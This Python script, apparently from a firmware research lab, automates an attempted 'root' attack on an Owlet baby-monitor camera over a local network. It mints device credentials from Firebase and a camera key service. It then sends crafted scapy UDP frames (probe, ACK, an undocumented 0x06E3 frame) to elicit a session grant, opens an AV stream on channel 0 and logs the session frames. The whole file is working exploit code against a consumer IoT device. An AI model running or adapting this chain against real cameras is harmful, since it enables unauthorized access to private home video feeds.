#!/usr/bin/env python3
"""Owlet root attempt — the full mint→probe→ACK→0x06E3→avClientStart chain in one command.

Fires ONLY when .4.163 answers (ARP present or frames on the wire). Sequence, all pieces
previously proven live (fss-kemuu):

  1. liveness: ARP present OR the camera sourcing frames on en1 (wake-probe sniff)
  2. mint fresh {tutkid, authKey, password} from Firebase + camera-kms (1 h cache OK)
  3. probe (0x0601) → nO (0x0602, R echo) → ACK ([64]=0x02) → second 0x0602
  4. the 0x06E3 candidate frame (the only non-standard type that answers)
  5. on ANY 0x2041 grant: avClientStart channel 0 with the minted authKey as account,
     recording session_hdr + 10 s of session frames
  6. every frame hex+timing logged to /tmp/owlet_root_attempt.log

Exit 0 = grant observed. Exit 1 = camera absent or no grant (log says which stage).

  sudo deliverables/scripts/owlet_root_attempt.sh          # one attempt
  sudo deliverables/scripts/owlet_root_attempt.sh --rounds 3
"""
import argparse
import datetime
import json
import os
import socket
import struct
import subprocess
import sys
import time

CAM_IP = "192.168.4.163"
CAM_MAC = "38:01:46:ab:83:8a"
MY_IP = "192.168.4.160"
IFACE = "en1"
PORT = 63616
UID = b"TDEWNKCZVSYLVLT7111A"
LOG = "/tmp/owlet_root_attempt.log"
CUBO = os.path.expanduser("~/fw-lab/owlet/cubo")
sys.path.insert(0, CUBO)
import cuboai_pure_owlet as cp  # the proven stack: transcode, inv_transcode, build_av_connect


def log(msg):
    line = f"{datetime.datetime.now().isoformat(timespec='milliseconds')} {msg}"
    print(line, flush=True)
    try:
        with open(LOG, "a") as f:
            f.write(line + "\n")
    except OSError:
        pass


def liveness(timeout=8):
    """ARP present, or the camera sourcing frames after a wake-probe sniff."""
    r = subprocess.run(["arp", "-n", CAM_IP], capture_output=True, text=True)
    if CAM_MAC[:8].lower() in r.stdout.lower().replace("38:1:46", "38:01:46"):
        return True
    p = subprocess.Popen(["tcpdump", "-n", "-c", "1", "-i", IFACE, "-e",
                          f"ether src {CAM_MAC}"],
                         stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
    time.sleep(1.5)
    # wake probe (harmless: wakes the search responder, opens no session)
    try:
        from scapy.all import Ether, IP, UDP, sendp
        sendp(Ether(dst=CAM_MAC) / IP(src=MY_IP, dst=CAM_IP)
              / UDP(sport=0, dport=PORT) / cp.build_probe(UID, 0x2ac2),
              iface=IFACE, verbose=0)
    except Exception:
        pass
    try:
        out, _ = p.communicate(timeout=timeout)
        p.terminate()
        return CAM_MAC[:8].lower() in (out or "").lower()
    except subprocess.TimeoutExpired:
        p.kill()
        return False


def mint_if_stale(max_age=3600):
    """Refresh credentials via the proven watcher mint path when older than max_age."""
    cred_path = os.path.expanduser("~/.config/fss/owlet_credentials.json")
    cred = None
    try:
        with open(cred_path) as f:
            cred = json.load(f)
    except (OSError, ValueError):
        pass
    if cred and time.time() - cred.get("minted_at", 0) < max_age:
        log(f"creds cached (tutkid={cred['tutkid']}, age "
            f"{int(time.time() - cred['minted_at'])}s)")
        return cred
    script = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                          "owlet_relay_watch.py")
    r = subprocess.run(["python3", script, "mint"], capture_output=True, text=True)
    log(r.stdout.strip() or "mint: no output")
    try:
        with open(cred_path) as f:
            return json.load(f)
    except (OSError, ValueError):
        return None


def frame(t08, t09, R, ack=False):
    """88-byte LAN-search layout with arbitrary plaintext type ([8]=0x06,[9]=low)."""
    t = bytearray(88)
    t[0:16] = bytes.fromhex("04021a02480000000106210000000000")
    t[8] = t08
    t[9] = t09
    t[16:36] = UID
    t[48:56] = bytes.fromhex("0000000001010204")
    t[56:58] = struct.pack("<H", R & 0xFFFF)
    t[58:64] = bytes.fromhex("000200000000")
    t[64] = 0x02 if ack else 0x01
    t[80:88] = bytes.fromhex("63041313040c0c63")
    return cp.transcode(bytes(t), swap_tail=False)


def attempt(cred, wait_grant=4.0, post_grant=10.0):
    """One full chain. Returns (stage, grant|None)."""
    rx = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    rx.settimeout(2.5)
    rx.bind((MY_IP, 0))
    sport = rx.getsockname()[1]
    t0 = time.time()

    def send(p):
        from scapy.all import Ether, IP, UDP, sendp
        sendp(Ether(dst=CAM_MAC) / IP(src=MY_IP, dst=CAM_IP)
              / UDP(sport=sport, dport=PORT) / p, iface=IFACE, verbose=0)

    def ts():
        return round(time.time() - t0, 3)

    try:
        R = cp.gen_R()
        probe = frame(0x01, 0x06, R)
        ack = frame(0x01, 0x06, R, ack=True)
        cand = frame(0x06, 0xE3, R)
        send(probe)
        send(probe)
        raw, addr = rx.recvfrom(2048)                     # nO
        d = cp.inv_transcode(raw)
        R2 = cp.nO_recover_R(raw)
        log(f"nO {len(raw)}B type=0x{d[8:10].hex()} R_echo={hex(R2 or 0)} "
            f"from={addr[1]} t+{ts()}s hex={raw[:80].hex()}")
        if R2 is not None and R2 != R:
            log(f"R mismatch (ours {hex(R)}) — aborting attempt")
            return "R-mismatch", None
        send(ack)
        raw2, addr2 = rx.recvfrom(2048)                   # second 0x0602
        d2 = cp.inv_transcode(raw2)
        log(f"ack-reply {len(raw2)}B type=0x{d2[8:10].hex()} t+{ts()}s")
        send(cand)                                        # the 0x06E3 discriminator
        log(f"0x06E3 sent 88B t+{ts()}s hex={cand[:80].hex()}")
        # the proven grant_loop pattern: av0 immediately after the second 0x0602 (and
        # again after 0x06E3) — two arming chances per round
        tok0 = struct.pack("<I", (int.from_bytes(os.urandom(4), "little") & 0x7FFFFFFF) or 1)
        av_pre = cp.build_av_connect(None, d2, 0,
                                     cred.get("authKey", "").encode(),
                                     cred.get("password", "").encode(),
                                     token=tok0, R=R)
        send(av_pre)
        log(f"AV-CONNECT ch0 (pre) {len(av_pre)}B t+{ts()}s")
        # grant wait
        rx.settimeout(wait_grant)
        grant = None
        try:
            while True:
                raw3, a3 = rx.recvfrom(65535)
                d3 = cp.xor_frame(raw3) if len(raw3) == 88 else cp.inv_transcode(raw3)
                typ = int.from_bytes(d3[8:10], "little") if len(d3) >= 10 else 0
                log(f"reply {len(raw3)}B type=0x{typ:04x} from={a3[1]} t+{ts()}s "
                    f"hex={raw3[:120].hex()}")
                if len(raw3) == 88 and d3[0:2] == b"\x20\x41" and typ == 0x2041:
                    grant = (raw3, d3, a3)
                    break
        except socket.timeout:
            pass
        if not grant:
            return "no-grant", None
        log(f"*** GRANT 0x2041 *** t+{ts()}s session_hdr="
            f"{bytes(grant[1][16:32]).hex()}")
        # avClientStart channel 0 with the minted authKey (post-grant confirm)
        tok = struct.pack("<I", (int.from_bytes(os.urandom(4), "little") & 0x7FFFFFFF) or 1)
        av0 = cp.build_av_connect(None, grant[1], 0,
                                  cred.get("authKey", "").encode(),
                                  cred.get("password", "").encode(),
                                  token=tok, R=R)
        send(av0)
        log(f"AV-CONNECT ch0 (post-grant) {len(av0)}B sent (authKey as account) "
            f"t+{ts()}s hex={av0[:120].hex()}")
        rx.settimeout(post_grant)
        frames = 0
        t1 = time.time()
        try:
            while time.time() - t1 < post_grant:
                raw4, a4 = rx.recvfrom(65535)
                d4 = cp.inv_transcode(raw4)
                frames += 1
                log(f"session {len(raw4)}B type=0x{d4[8:10].hex()} t+{ts()}s "
                    f"hex={raw4[:96].hex()}")
        except socket.timeout:
            pass
        log(f"session closed: {frames} post-grant frames")
        return "granted", grant
    except socket.timeout:
        return "no-nO", None
    finally:
        rx.close()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--rounds", type=int, default=1)
    ap.add_argument("--require-live", action="store_true", default=True)
    a = ap.parse_args()
    if not liveness():
        log("root attempt: camera ABSENT (ARP + wire both negative) — not firing")
        return 1
    log("root attempt: camera PRESENT")
    cred = mint_if_stale()
    if not cred:
        log("root attempt: no credentials — run owlet_relay_watch.py mint")
        return 1
    for r in range(1, a.rounds + 1):
        stage, grant = attempt(cred)
        log(f"root attempt round {r}: stage={stage} "
            f"{'GRANT' if grant else 'no grant'}")
        if grant:
            log("ROOT PATH COMPLETE: grant + avClientStart executed; log has every frame")
            return 0
        time.sleep(2)
    return 1


if __name__ == "__main__":
    sys.exit(main())
